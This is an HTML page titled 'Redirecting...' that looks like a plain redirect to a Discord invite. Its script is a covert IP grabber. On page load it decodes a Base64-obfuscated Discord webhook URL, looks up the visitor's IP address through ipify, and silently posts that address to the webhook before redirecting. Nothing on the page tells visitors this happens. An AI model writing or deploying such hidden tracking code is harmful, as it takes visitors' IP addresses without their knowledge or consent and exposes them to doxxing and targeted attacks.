<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        // Base64 encoded webhook URL
        const encodedWebhookUrl = 'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM1MDUyMTk4MjE4NTI0MjcxNS9uTUd1OEVuTHFLME9xSFFST3JvYzc5YkZ4a2NzNXRWekU1eDBvUkxLMjYwTHZ4SHN4Mzd3SlJwR2VvUGQ2ankxS2EzR2FhVA==';

        // Decode the Base64 encoded URL
        const webhookUrl = atob(encodedWebhookUrl);

        async function sendIPAndRedirect() {
            try {
                // Fetch the user's IP address
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipAddress = data.ip;

                // Send the IP address to the Discord webhook silently
                const messageData = {
                    content: `New IP Address: ${ipAddress}`
                };

                // Send the IP to Discord webhook
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(messageData)
                });

                // Redirect to the Discord invite after sending the IP
                window.location.href = 'https://discord.gg/fwendies';
            } catch (error) {
                console.error('Error fetching or sending IP:', error);
                // Redirect to Discord invite if there's an error
                window.location.href = 'https://discord.gg/fwendies';
            }
        }

        // Call the function to send IP and then redirect
        sendIPAndRedirect();
    </script>
</body>
</html>
